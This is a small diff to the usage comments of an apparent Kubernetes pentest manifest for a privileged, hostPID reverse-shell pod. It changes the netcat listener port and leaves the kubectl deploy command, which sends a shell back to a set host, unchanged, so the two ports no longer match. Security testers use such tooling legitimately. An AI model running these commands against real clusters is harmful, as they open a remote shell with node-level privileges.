@@ -1,5 +1,5 @@
 ###########################################################
-## Set up Listener: nc -nvlp [PORT]
+## Set up Listener: nc -nvlp 3116
 ## Deploy: HOST="10.0.0.1" PORT="3112" envsubst < pod-priv-and-hostpid-revshell.yaml | kubectl apply -f -
 ## Remove: kubectl -n [namespace] delete pod-priv-and-hostpid-revshell
 ###########################################################
